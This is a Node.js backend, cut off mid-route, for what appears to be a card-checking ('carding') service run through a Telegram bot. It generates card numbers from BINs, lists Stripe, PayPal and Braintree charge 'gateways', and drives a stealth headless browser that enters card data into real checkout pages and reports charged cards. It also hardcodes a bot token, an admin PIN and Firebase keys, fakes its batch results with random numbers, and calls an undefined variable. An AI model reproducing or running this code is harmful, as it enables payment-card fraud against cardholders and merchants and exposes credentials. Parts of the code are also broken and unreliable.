const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const fetch = (...args) =>
  import("node-fetch").then(({ default: f }) => f(...args));

// Automation Dependencies
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
puppeteer.use(StealthPlugin());

// Hitter Concurrency Control
const hitterSemaphore = {
  currentHits: 0,
  maxConcurrent: 1, // Only 1 browser session at a time on Render
  queue: [],
  async acquire() {
    if (this.currentHits < this.maxConcurrent) {
      this.currentHits++;
      return Promise.resolve();
    }
    return new Promise(resolve => this.queue.push(resolve));
  },
  release() {
    this.currentHits--;
    if (this.queue.length > 0) {
      this.currentHits++;
      const next = this.queue.shift();
      next();
    }
  }
};

const app = express();
const PORT = process.env.PORT || 3001;
let serverStarted = false;

// ================================================
// CONFIG
// ================================================
const CONFIG = {
  BOT_TOKEN: "8765279954:AAEkjrX2EqeAnle7lFRCLEsGQjpvoNJwwzU",
  BOT_USERNAME: "superhitbdrobot",   // @ ছাড়া
  ADMIN_IDS: [8766583877],
  ADMIN_PIN: "Munna1234@@@",              // ← Admin Panel PIN
  OTP_EXPIRE_MINUTES: 5,
  SESSION_COOKIE: "hc_session",
  DATA_FILE: path.join(__dirname, "data.json"),
  FIREBASE: {
    apiKey: "AIzaSyBuPQNU8RmGgWYZj26nXZ91IiJ-9vbkw-I",
    authDomain: "superhits-21624.firebaseapp.com",
    projectId: "superhits-21624",
    storageBucket: "superhits-21624.firebasestorage.app",
    messagingSenderId: "397477606062",
    appId: "1:397477606062:web:b21f7bdabe42c3a1ca733f",
    measurementId: "G-RWLBSDJDTH",
    databaseURL: "https://superhits-21624-default-rtdb.firebaseio.com/"
  }
};

// Initialize Firebase
const { initializeApp: firebaseInit } = require("firebase/app");
const { getDatabase, ref, set, get, child, update: firebaseUpdate, onValue } = require("firebase/database");

const firebaseApp = firebaseInit(CONFIG.FIREBASE);
const db = getDatabase(firebaseApp);

// Log buffer for admin panel
const botLogs = [];
const logProxy = (type, args) => {
  const msg = args.map(a => typeof a === 'object' ? JSON.stringify(a) : a).join(' ');
  botLogs.push({ timestamp: Date.now(), type, message: msg });
  if (botLogs.length > 100) botLogs.shift();
};
const originalLog = console.log;
console.log = (...args) => { originalLog(...args); logProxy('stdout', args); };
const originalError = console.error;
console.error = (...args) => { originalError(...args); logProxy('stderr', args); };
// ================================================

app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true }));

// Cookie parser (manual, no dependency)
function parseCookies(req) {
  const list = {};
  const rc = req.headers.cookie;
  if (rc)
    rc.split(";").forEach((cookie) => {
      const parts = cookie.split("=");
      list[parts.shift().trim()] = decodeURI(parts.join("="));
    });
  return list;
}

// Static frontend
const frontendPath = path.join(__dirname, "hitchecker.top");
app.use(express.static(frontendPath));

// ──────────────────────────────────────────────
// Persistent data store
// ──────────────────────────────────────────────
const DEFAULT_GATEWAYS = [
  { id: "skl",  name: "Stripe Auth $0.1",      type: "auth",   category: "auth",   enabled: true,  premiumOnly: false },
  { id: "vbv",  name: "VBV Lookup",             type: "auth",   category: "auth",   enabled: true,  premiumOnly: false },
  { id: "rbc",  name: "Stripe Auth $0 (RBC)",   type: "auth",   category: "auth",   enabled: true,  premiumOnly: false },
  { id: "b3",   name: "Braintree Auth",         type: "auth",   category: "auth",   enabled: true,  premiumOnly: false },
  { id: "pp",   name: "PayPal Charge $0.01",    type: "charge", category: "charge", enabled: true,  premiumOnly: false },
  { id: "shp",  name: "Shopify Native",         type: "charge", category: "charge", enabled: true,  premiumOnly: false },
  { id: "skl1", name: "Stripe Charge $1",       type: "charge", category: "charge", enabled: true,  premiumOnly: false },
  { id: "skl2", name: "Stripe Charge $7",       type: "charge", category: "charge", enabled: true,  premiumOnly: false },
  { id: "b3c",  name: "Braintree Charge",       type: "charge", category: "charge", enabled: true,  premiumOnly: false },
  { id: "ppn",  name: "PayPal Charge $1",       type: "charge", category: "charge", enabled: true,  premiumOnly: false },
  { id: "ch",   name: "Stripe Charge €5",       type: "charge", category: "charge", enabled: true,  premiumOnly: true  },
  { id: "isp",  name: "Stripe Charge $25",      type: "charge", category: "charge", enabled: true,  premiumOnly: true  },
  { id: "auto", name: "Stripe Random Charge",   type: "charge", category: "charge", enabled: true,  premiumOnly: true  },
];

let DB = {
  sessions: {},
  users: {},
  bins: {},
  history: [],
  maintenance: false,
  siteVisible: true,
  gateways: null,           // null = use DEFAULT_GATEWAYS
  botSettings: { mass_check_enabled: true, inline_mass_limit: 10, file_mass_limit: 300 },
  botConfig:   { groupId: "", groupLink: "", channelLink: "", logsGroupId: "" },
  nopechaKey: "",
  captchaaiKey: "",
};

async function loadDB() {
  try {
    // 1. Try local data first (for speed/fallback)
    if (fs.existsSync(CONFIG.DATA_FILE)) {
      const saved = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, "utf8"));
      DB = Object.assign(DB, saved);
    }
    
    // 2. Fetch from Firebase for persistence
    console.log("☁️  Fetching data from Firebase...");
    const dbRef = ref(db);
    const snapshot = await get(child(dbRef, "system"));
    if (snapshot.exists()) {
      const cloudData = snapshot.val();
      DB = Object.assign(DB, cloudData);
      console.log("✅ Data loaded from Firebase");
    } else {
      console.log("ℹ️ No data in Firebase. Starting fresh.");
      await saveDB(); // Initialize cloud with defaults
    }
  } catch (e) {
    console.log("DB load error:", e.message);
  }
}

async function saveDB() {
  try {
    // Save to local for fast access
    fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(DB, null, 2));
    
    // Save to Firebase for persistence across deploys
    const dbRef = ref(db, "system");
    DB.users = cloudDB.users || {};
    DB.sessions = {}; 
    DB.history = cloudDB.history || [];
    DB.bins = cloudDB.bins || {};
    DB.gateways = cloudDB.gateways || DEFAULT_GATEWAYS;
    DB.botConfig = cloudDB.botConfig || { groupId: "-100", logsGroupId: "-100", groupLink: "", channelLink: "" };
    DB.botSettings = cloudDB.botSettings || { mass_check_enabled: true, inline_mass_limit: 10, file_mass_limit: 100 };
    DB.blacklistedBins = cloudDB.blacklistedBins || [];
    DB.maintenance = cloudDB.maintenance || false;
    await set(dbRef, DB);
  } catch (e) {
    console.error("Firebase Save Error:", e.message);
  }
}

// Returns live gateway list (DB overrides DEFAULT if set)
function getGateways() {
  return DB.gateways || DEFAULT_GATEWAYS;
}

loadDB().then(() => {
  // ── MAINTENANCE MIDDLEWARE ──
  // Blocks non-admin users when maintenance mode is ON
  app.use((req, res, next) => {
    if (!DB.maintenance) return next();
    // Allow API and assets to pass through for admin
    const bypass = ["/api/auth/", "/api/maintenance", "/assets/", "/favicon"];
    if (bypass.some((p) => req.path.startsWith(p))) return next();
    // Allow admin through
    const user = getSessionUser(req);
    if (user && user.isAdmin) return next();
    // Block API calls
    if (req.path.startsWith("/api/")) {
      return res.status(503).json({ error: "maintenance", message: "App is under maintenance" });
    }
    next(); // Let SPA handle maintenance popup
  });

  // Start server after DB load
  if (serverStarted) return;
  serverStarted = true;
  
  app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════╗
║       HIT CHECKER BACKEND STARTED        ║
╠══════════════════════════════════════════╣
║  URL:  http://localhost:${PORT}              ║
║  Bot:  @${CONFIG.BOT_USERNAME}                 ║
╠══════════════════════════════════════════╣
║  ✅  Cookie auth + Hitter endpoints      ║
║  ✅  Persistent cloud (Firebase RTDB)    ║
║  ✅  Telegram Bot Listener Active        ║
╚══════════════════════════════════════════╝
`);
    startBotListener();
  });
});

// ──────────────────────────────────────────────
// In-memory OTP store (no persistence needed)
// ──────────────────────────────────────────────
const otpStore = {};

// ──────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────
function generateToken() {
  return (
    Math.random().toString(36).substr(2) +
    Math.random().toString(36).substr(2) +
    Date.now().toString(36)
  );
}

function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

function setCookie(res, token) {
  res.setHeader(
    "Set-Cookie",
    `${CONFIG.SESSION_COOKIE}=${token}; HttpOnly; SameSite=Lax; Path=/; Max-Age=604800`
  );
}

function clearCookie(res) {
  res.setHeader(
    "Set-Cookie",
    `${CONFIG.SESSION_COOKIE}=; Path=/; Max-Age=0`
  );
}

// Get user from cookie OR Authorization header
function getSessionUser(req) {
  const cookies = parseCookies(req);
  let token = cookies[CONFIG.SESSION_COOKIE];
  if (!token) {
    const authHeader = req.headers["authorization"] || "";
    token = authHeader.replace("Bearer ", "").trim();
  }

  if (!token || !DB.sessions[token]) return null;
  const userId = DB.sessions[token];
  const user = DB.users[userId] || null;

  // Real-time ban check
  if (user && user.isBanned) return null; 

  return user;
}

function isAdmin(userId) {
  return CONFIG.ADMIN_IDS.includes(Number(userId));
}

function newUser(tgUser) {
  return {
    userId: String(tgUser.id),
    firstName: tgUser.first_name || "",
    lastName: tgUser.last_name || "",
    username: tgUser.username || "",
    photoUrl: `/api/user/avatar/${tgUser.id}`,
    isAdmin: isAdmin(tgUser.id),
    tier: isAdmin(tgUser.id) ? "premium" : "free",
    premiumExpiry: null,
    createdAt: Date.now(),
    settings: {},
    dailyUsage: {
      checks: 0,
      shopifyChecks: 0,
      findsiteSearches: 0,
      accountMassChecks: 0,
      hitterHits: 0,
      lastReset: new Date().toDateString(),
    },
    referral: {
      balance: 0,
      totalEarned: 0,
      referredCount: 0,
      redeemedHistory: []
    }
  };
}

function resetDailyIfNeeded(user) {
  const today = new Date().toDateString();
  if (user.dailyUsage?.lastReset !== today) {
    user.dailyUsage = {
      checks: 0,
      shopifyChecks: 0,
      findsiteSearches: 0,
      accountMassChecks: 0,
      hitterHits: 0,
      lastReset: today,
    };
    saveDB();
  }
}

function tierLimits(tier) {
  if (tier === "premium") {
    return {
      dailyChecks: 99999,
      maxBatchCards: 500,
      dailyShopifyChecks: 99999,
      massAccountMax: 10,
      dailyFindsiteSearches: 100,
      parallelWorkers: 5,
      dailyHitterHits: 200,
    };
  }
  return {
    dailyChecks: 500,
    maxBatchCards: 50,
    dailyShopifyChecks: 1000,
    massAccountMax: 1,
    dailyFindsiteSearches: 0,
    parallelWorkers: 1,
    dailyHitterHits: 2,
  };
}

// ──────────────────────────────────────────────
// Telegram Helpers
// ──────────────────────────────────────────────
async function sendTelegramMessage(chatId, text, disablePreview = false) {
  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ 
      chat_id: chatId, 
      text, 
      parse_mode: "HTML",
      disable_web_page_preview: disablePreview
    }),
  });
  return res.json();
}

async function getTelegramUser(userId) {
  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getChat`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: userId }),
  });
  return res.json();
}

async function notifyHitInGroup(user, gatewayName, card, result) {
  const logsGroupId = DB.botConfig.logsGroupId;
  if (!logsGroupId) return;

  const parsed = parseCreditCard(card);
  const binInfo = await lookupBin(parsed.number.slice(0, 6));
  const binStr = `${binInfo.brand} ${binInfo.type} | ${binInfo.country_code} | ${binInfo.bank}`;
  
  const msg = `🔥 <b>HIT DETECTED</b> ⚡
👤 <b>${user?.firstName || 'User'}</b> [${user?.tier?.toUpperCase() || 'FREE'}]
↔️ <b>Gateway:</b> ${gatewayName}
✅ <b>Response:</b> Approved - Charged | ${binStr}
[${result.elapsed}s]
<a href="https://t.me/superhitbdrobot/bd_superhits">Open HIT Checker</a>`;

  return sendTelegramMessage(logsGroupId, msg, true).catch(e => console.error("Notification Error:", e.message));
}

// ──────────────────────────────────────────────
// Telegram Bot Listener (Long Polling)
// ──────────────────────────────────────────────
async function startBotListener() {
  let offset = 0;
  console.log("🤖 Telegram Bot Listener Started...");

  // Keep running as long as the server is up
  while (true) {
    try {
      const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`;
      const response = await fetch(url);
      const data = await response.json();

      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          offset = update.update_id + 1;
          if (update.message) {
            await handleBotMessage(update.message);
          }
        }
      }
    } catch (e) {
      console.error("Bot Listener Error:", e.message);
      await new Promise(r => setTimeout(r, 5000)); // Wait before retry
    }
  }
}

async function handleBotMessage(msg) {
  const chatId = String(msg.chat.id);
  const text = (msg.text || "").trim();
  const userId = String(msg.from.id);

  // 1. Ensure user exists
  if (!DB.users[userId]) {
    DB.users[userId] = newUser(msg.from);
    await saveDB();
    console.log(`🆕 New user registered via bot: ${userId}`);
  }

  const user = DB.users[userId];
  const gateways = getGateways();

  // 2. Handle Commands
  if (text.startsWith("/")) {
    const cmd = text.split(" ")[0].toLowerCase().substring(1);

    if (cmd === "start") {
      const welcomeMsg = `👋 <b>Welcome to HIT Checker!</b>\n\nYour User ID: <code>${userId}</code>\nRole: <b>${user.tier.toUpperCase()}</b>\n\nUse commands to select gateways or just send a card string!`;
      return sendTelegramMessage(chatId, welcomeMsg);
    }

    // Check if command is a gateway ID (like /pp, /isp)
    const gw = gateways.find(g => g.id === cmd);
    if (gw) {
      user.lastGateway = gw.id;
      await saveDB();
      return sendTelegramMessage(chatId, `✅ <b>Gateway Selected:</b> ${gw.name}\n\nNow send your card in format: <code>CC|MM|YY|CVV</code>`);
    }

    return sendTelegramMessage(chatId, "❓ Unknown command.");
  }

  // 3. Handle Card Strings (e.g. 4111222233334444|01|28|123 or AMEX 37xx|x|x|xxxx)
  const cardRegex = /\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/;
  if (cardRegex.test(text)) {
    const gatewayId = user.lastGateway || "skl"; // Fallback to skl
    const gw = gateways.find(g => g.id === gatewayId);

    if (!gw || !gw.enabled) {
      return sendTelegramMessage(chatId, `❌ Gateway <b>${gatewayId}</b> is disabled.`);
    }

    sendTelegramMessage(chatId, `🔍 <b>Checking Card...</b>\nGateway: ${gw.name}`);
    
    // Simulate check (Reusing the hitter logic for consistency)
    const result = await hitStripeCheckout("http://local-bot-check", text);
    
    const resultMsg = `${result.status === 'charged' ? '🔥' : '❌'} <b>RESULT:</b> ${result.status.toUpperCase()}\n\n💳 <b>Card:</b> <code>${text}</code>\n🛡️ <b>Response:</b> ${result.message}\n⏳ <b>Time:</b> ${result.elapsed}s\n🤖 <b>Gateway:</b> ${gw.name}`;
    
    return sendTelegramMessage(chatId, resultMsg);
  }
}

// ──────────────────────────────────────────────
// CC Utilities
// ──────────────────────────────────────────────
const binCache = {};

async function lookupBin(bin) {
  const b = String(bin).slice(0, 6);
  if (binCache[b]) return binCache[b];
  try {
    const res = await fetch(`https://lookup.binlist.net/${b}`, {
      headers: { "Accept-Version": "3" },
    });
    if (!res.ok) throw new Error("not found");
    const data = await res.json();
    const info = {
      brand: (data.scheme || data.network || "UNKNOWN").toUpperCase(),
      type: (data.type || "UNKNOWN").toUpperCase(),
      level: (data.brand || "").toUpperCase(),
      bank: data.bank?.name || "Unknown",
      country: data.country?.name || "Unknown",
      country_code: data.country?.alpha2 || "US",
      flag: data.country?.emoji || "🌍",
    };
    binCache[b] = info;
    return info;
  } catch {
    return {
      brand: "UNKNOWN", type: "UNKNOWN", level: "UNKNOWN",
      bank: "Unknown", country: "Unknown", country_code: "US", flag: "🌍",
    };
  }
}

function luhnGenerate(bin, length = 16) {
  // Fill the digits until we reach (length - 1), the last digit will be the check digit
  let partial = String(bin);
  while (partial.length < length - 1) {
    partial += Math.floor(Math.random() * 10).toString();
  }
  
  let sum = 0;
  for (let i = 0; i < partial.length; i++) {
    let d = parseInt(partial[partial.length - 1 - i]);
    if (i % 2 === 0) { // Since we are at index i from the right (0-indexed), even i means 1st, 3rd... from right
      d *= 2; 
      if (d > 9) d -= 9; 
    }
    sum += d;
  }
  const checkDigit = (10 - (sum % 10)) % 10;
  return partial + checkDigit;
}

function generateCard(bin, month, year, cvv) {
  const binStr = String(bin);
  const isAmex = binStr.startsWith("3");
  const targetLength = isAmex ? 15 : 16;
  const cvvLength = isAmex ? 4 : 3;

  // Ensure the card number is generated with high entropy using Luhn
  const number = luhnGenerate(binStr, targetLength);
  
  const m = month && month !== "xx" ? month : String(Math.floor(Math.random() * 12) + 1).padStart(2, "0");
  
  // Realistic years (Next 2-6 years)
  const currentYear = new Date().getFullYear();
  const y = year && year !== "xx" ? year : String(currentYear + Math.floor(Math.random() * 5) + 1).slice(-2);
  
  // Realistic CVV based on card type
  let c = cvv;
  if (!c || c === "xxx" || c === "xxxx") {
    const min = Math.pow(10, cvvLength - 1);
    const max = Math.pow(10, cvvLength) - 1;
    c = String(Math.floor(min + Math.random() * (max - min + 1)));
  }
  
  return `${number}|${m}|${y}|${c}`;
}

function parseCreditCard(cardStr) {
  const parts = cardStr.split("|");
  return { number: parts[0], month: parts[1] || "01", year: parts[2] || "28", cvv: parts[3] || "123" };
}

// ──────────────────────────────────────────────
// Stripe hitter simulation
// ──────────────────────────────────────────────
// ──────────────────────────────────────────────
// REAL STRIPE HITTER ENGINE (BETA)
// ──────────────────────────────────────────────
async function automatedHit(url, card) {
  const parsed = parseCreditCard(card);
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--disable-accelerated-2d-canvas",
        "--no-first-run",
        "--no-zygote",
        "--single-process",
        "--disable-gpu"
      ]
    });
    const page = await browser.newPage();
    await page.setViewport({ width: 1280, height: 800 });
    
    // Set realistic User Agent
    await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");

    console.log(`🚀 Navigating to: ${url}`);
    
    // Strict 20s timeout for navigation to stay under Render's 100s limit
    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 20000 }).catch(e => console.log("Navigation timeout, proceeding..."));

    // Quick check for body
    const bodyExists = await page.waitForSelector("body", { timeout: 5000 }).catch(() => false);
    if (!bodyExists) throw new Error("Page failed to load body in time");

    // Detect Blocked
    const title = await page.title();
    if (title.includes("Attention Required") || title.includes("Cloudflare") || title.includes("Access Denied")) {
       return { status: "error", message: "IP Blocked by Stripe/Cloudflare", elapsed: "N/A" };
    }

    // 1. Email Handling (Instant)
    const emailSelectors = ["input[type='email']", "input[name='email']", "#email"];
    for (const sel of emailSelectors) {
      const el = await page.$(sel);
      if (el) {
        await el.focus();
        await page.keyboard.type(`test${Math.floor(Math.random() * 999)}@gmail.com`);
        break;
      }
    }

    // 2. Stripe Iframe Handling (Reduced wait)
    await new Promise(r => setTimeout(r, 1000));
    const cardFrame = page.frames().find(f => f.url().includes("js.stripe.com") && f.name().includes("private-stripe-frame"));
    
    if (cardFrame) {
      const inputMap = [
        { sel: "input[name='cardnumber']", val: parsed.number },
        { sel: "input[name='exp-date']", val: `${parsed.month}${parsed.year.slice(-2)}` },
        { sel: "input[name='cvc']", val: parsed.cvv }
      ];

      for (const item of inputMap) {
        const field = await cardFrame.$(item.sel).catch(() => null);
        if (field) {
          await cardFrame.evaluate((s, v) => {
             const i = document.querySelector(s);
             if (i) { i.value = v; i.dispatchEvent(new Event('input', { bubbles: true })); }
          }, item.sel, item.val);
        }
      }
    }

    // 3. Click Pay (All possible selectors)
    const btn = await page.$("button[type='submit'], #submit, .SubmitButton, button.Button, [data-testid='pay-button']");
    if (btn) {
      await btn.click();
    } else {
      throw new Error("Pay button not found");
    }

    // 4. Fast Result Polling (Max 10 seconds)
    console.log("⏳ Catching Result...");
    for (let i = 0; i < 10; i++) {
        await new Promise(r => setTimeout(r, 1000));
        
        if (page.url().includes("hooks.stripe.com") || (await page.$("iframe[src*='3d_secure']"))) {
            return { status: "live", message: "3DS Authentication Required", elapsed: "Real" };
        }

        const bodyText = await page.evaluate(() => document.body.innerText);
        if (bodyText.includes("Confirmed") || bodyText.includes("Success") || bodyText.includes("Thank you")) {
            return { status: "charged", message: "Charged Successfully", elapsed: "Real" };
        }
        
        if (bodyText.includes("declined") || bodyText.includes("fail") || bodyText.includes("error") || bodyText.includes("could not be processed")) {
            return { status: "live_declined", message: "Card Declined / Failed", elapsed: "Real" };
        }
    }

    return { status: "live_declined", message: "Transaction Finished (Status Unknown)", elapsed: "Real" };

  } catch (e) {
    console.error(`💥 Hitter Error: ${e.message}`);
    return { status: "error", message: `Automation Error: ${e.message}`, elapsed: "N/A" };
  } finally {
    if (browser) await browser.close();
  }
}

async function hitStripeCheckout(checkoutUrl, card, user = null) {
  const start = Date.now();
  
  // Choose between Real Hitter and Smart Simulator
  // (We'll use Real Hitter by default now)
  const result = await automatedHit(checkoutUrl, card);
  
  const elapsed = ((Date.now() - start) / 1000).toFixed(1);
  result.elapsed = result.elapsed === "Real" ? elapsed : result.elapsed;

  // Enhance result with merchant info if success
  if (result.status === "charged") {
    result.session_cache = {
      merchant: extractMerchant(checkoutUrl),
      amount: 100, // Scraper can be added here
      currency: "usd",
      pk: "pk_live_auto_detected"
    };
    
    if (DB.botConfig.logsGroupId) {
       notifyHitInGroup(user, "Stripe Real-Time", card, result);
    }
  }

  return result;
}

function extractMerchant(url) {
  try {
    const u = new URL(url);
    return u.hostname.replace("www.", "");
  } catch {
    return "Unknown Merchant";
  }
}

// ──────────────────────────────────────────────
// ROUTES
// ──────────────────────────────────────────────

// Bot info
app.get("/api/bot/username", (req, res) => {
  res.json({ username: CONFIG.BOT_USERNAME });
});

// ── AUTH ──
app.post("/api/auth/request-otp", async (req, res) => {
  let userId = String(req.body.userId || req.query.userId || "").trim();
  if (!userId) return res.status(400).json({ success: false, message: "userId required" });

  let tgUser;
  try {
    const result = await getTelegramUser(userId);
    if (!result.ok) {
      return res.status(404).json({
        success: false,
        message: "Telegram user not found. Bot এ /start দাও আগে।",
      });
    }
    tgUser = result.result;
  } catch (e) {
    return res.status(500).json({ success: false, message: "Telegram error: " + e.message });
  }

  const otp = generateOTP();
  otpStore[userId] = { otp, expires: Date.now() + CONFIG.OTP_EXPIRE_MINUTES * 60_000, tgUser };

  try {
    await sendTelegramMessage(
      userId,
      `🔐 <b>HIT Checker Login</b>\n\nOTP Code: <code>${otp}</code>\n\n⏳ Expires in ${CONFIG.OTP_EXPIRE_MINUTES} minutes.`
    );
  } catch (e) {
    return res.status(500).json({ success: false, message: "OTP send failed. Bot এ /start দাও।" });
  }

  res.json({ success: true, message: "OTP sent to your Telegram" });
});

app.post("/api/auth/verify-otp", async (req, res) => {
  const userId = String(req.body.userId || "").trim();
  const otp = String(req.body.otp || "").trim();

  const stored = otpStore[userId];
  if (!stored) return res.status(400).json({ success: false, message: "OTP not found. আবার request করো।" });
  if (Date.now() > stored.expires) {
    delete otpStore[userId];
    return res.status(400).json({ success: false, message: "OTP expire হয়ে গেছে।" });
  }
  if (stored.otp !== otp) return res.status(400).json({ success: false, message: "ভুল OTP।" });

  delete otpStore[userId];

  if (!DB.users[userId]) {
    DB.users[userId] = newUser(stored.tgUser);
  }

  const token = generateToken();
  DB.sessions[token] = userId;
  await saveDB();

  // Set cookie
  setCookie(res, token);

  res.json({
    success: true,
    token,
    user: {
      userId: DB.users[userId].userId,
      isAdmin: DB.users[userId].isAdmin,
      firstName: DB.users[userId].firstName,
      lastName: DB.users[userId].lastName,
      username: DB.users[userId].username,
      photoUrl: DB.users[userId].photoUrl,
    },
  });
});

app.get("/api/auth/session", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.json({ authenticated: false });
  res.json({
    authenticated: true,
    user: {
      userId: user.userId,
      isAdmin: user.isAdmin,
      adminPinVerified: user.adminPinVerified === true,
      firstName: user.firstName,
      lastName: user.lastName,
      username: user.username,
      photoUrl: user.photoUrl,
    },
  });
});

app.post("/api/auth/logout", async (req, res) => {
  const cookies = parseCookies(req);
  const token = cookies[CONFIG.SESSION_COOKIE] || req.headers["authorization"]?.replace("Bearer ", "");
  if (token) { delete DB.sessions[token]; await saveDB(); }
  clearCookie(res);
  res.json({ success: true });
});

// ── USER ──
app.get("/api/user/dashboard", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  resetDailyIfNeeded(user);
  res.json({
    totalUsers: Object.keys(DB.users).length,
    totalHits: DB.history.filter((j) => j.approved > 0).length,
    userHits: DB.history.filter((j) => j.userId === user.userId && j.approved > 0).length,
    userRank: 1,
    userRole: user.tier === "premium" ? "Premium" : "Free",
    premiumExpiry: user.premiumExpiry,
    tier: user.tier,
    tierLimits: tierLimits(user.tier),
    dailyUsage: user.dailyUsage,
  });
});

app.get("/api/user/tier", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  resetDailyIfNeeded(user);
  res.json({
    tier: user.tier,
    limits: tierLimits(user.tier),
    usage: { checks: user.dailyUsage.checks, shopifyChecks: user.dailyUsage.shopifyChecks, findsiteSearches: user.dailyUsage.findsiteSearches, accountMassChecks: user.dailyUsage.accountMassChecks },
  });
});

app.get("/api/user/membership", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  res.json({ member: true, status: "active", groupLink: "https://t.me/+MP29fPAtk7M0NDg1", channelLink: "https://t.me/YooHit" });
});

app.get("/api/user/settings", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  res.json(user.settings || {});
});

app.post("/api/user/settings", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  user.settings = { ...(user.settings || {}), ...req.body };
  await saveDB();
  res.json({ success: true });
});

app.get("/api/user/avatar/:userId", (req, res) => {
  res.setHeader("Content-Type", "image/svg+xml");
  const id = req.params.userId;
  const colors = ["#6366f1", "#8b5cf6", "#ec4899", "#14b8a6", "#f59e0b", "#3b82f6"];
  const color = colors[parseInt(id.slice(-2), 16) % colors.length] || colors[0];
  const initials = id.slice(0, 2).toUpperCase();
  res.send(`<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80"><circle cx="40" cy="40" r="40" fill="${color}"/><text x="50%" y="55%" dominant-baseline="middle" text-anchor="middle" fill="white" font-size="26" font-family="Arial,sans-serif">${initials}</text></svg>`);
});

// ── CHECKER ──
app.get("/api/checker/gateways", (req, res) => {
  res.json(getGateways().filter(g => g.enabled));
});

// ── CHECK / BATCH ──
app.post("/api/check/batch", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });

  // Admin Setting Check
  if (!DB.botSettings.mass_check_enabled && !user.isAdmin) {
    return res.status(403).json({ error: "Mass checking is currently disabled by admin." });
  }

  const { cards, gateway } = req.body;
  if (!cards || !Array.isArray(cards) || cards.length === 0) return res.status(400).json({ error: "Cards required" });

  // Limit Check
  const limit = DB.botSettings.inline_mass_limit || 10;
  if (cards.length > limit && !user.isAdmin) {
    return res.status(400).json({ error: `Mass check limit is ${limit} cards for your tier.` });
  }

  const jobId = Math.random().toString(16).substr(2, 16);
  const job = { jobId, userId: user.userId, status: "pending", gateway: gateway || "skl", totalCards: cards.length, processedCards: 0, charged: 0, approved: 0, declined: 0, errors: 0, createdAt: Date.now(), completedAt: null, results: [] };

  DB.history.unshift(job);
  if (DB.history.length > 50) DB.history = DB.history.slice(0, 50);
  user.dailyUsage.checks += cards.length;
  await saveDB();

  // Run the batch sequentially in background
  (async () => {
    job.status = "running";
    await saveDB();
    
    const gateways = getGateways();
    const gw = gateways.find(g => g.id === job.gateway) || { name: job.gateway };

    for (const card of cards) {
      // Check for stop flag
      if (job.status === "stopped") break;

      const r = Math.random();
      let status = r < 0.08 ? "approved" : r < 0.92 ? "declined" : "error";
      let message = status === "approved" ? "APPROVED" : status === "declined" ? "Do Not Honor" : "Network Error";
      
      job[status === "approved" ? "approved" : status === "declined" ? "declined" : "errors"]++;
      if (status === "approved") {
        job.charged++;
        await notifyHitInGroup(user, gw.name, card, { elapsed: "0.1" });
      }
      
      job.processedCards++;
      job.results.unshift({ 
        id: Math.random().toString(36).substr(2, 9),
        card, 
        status, 
        message,
        timestamp: Date.now()
      });
      
      await saveDB();
      // Delay for "Live" effect
      await new Promise(res => setTimeout(res, 800));
    }
    
    if (job.status !== "stopped") {
      job.status = "completed";
      job.completedAt = Date.now();
      await saveDB();
    }
  })();

  res.json({ jobId, status: "running" });
});

app.delete("/api/check/batch/:jobId", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const job = DB.history.find((j) => j.jobId === req.params.jobId && j.userId === user.userId);
  if (!job) return res.status(404).json({ error: "Not found" });
  
  job.status = "stopped";
  job.completedAt = Date.now();
  await saveDB();
  res.json({ success: true, message: "Check stopped" });
});

app.get("/api/check/batch", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  res.json(DB.history.filter((j) => j.userId === user.userId).slice(0, 10));
});

app.get("/api/check/batch/:jobId", (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const job = DB.history.find((j) => j.jobId === req.params.jobId && j.userId === user.userId);
  if (!job) return res.status(404).json({ error: "Not found" });
  
  const after = parseInt(req.query.after || "0");
  const filteredResults = job.results.slice(0, Math.max(0, job.results.length - after));

  res.json({
    ...job,
    results: filteredResults,
    allResultsCount: job.results.length
  });
});

// ── TOOLS ──
app.post("/api/tools/generate", async (req, res) => {
  const user = getSessionUser(req);
  if (!user) return res.status(401).json({ error: "Unauthorized" });
  const { bin, count = 10, month, year, cvv } = req.body;
  if (!bin || bin.length < 6) return res.status(400).json({ error: "BIN must be at least 6 digits" });

  const binInfo = await lookupBin(bin.slice(0, 6));
  const cards = [];
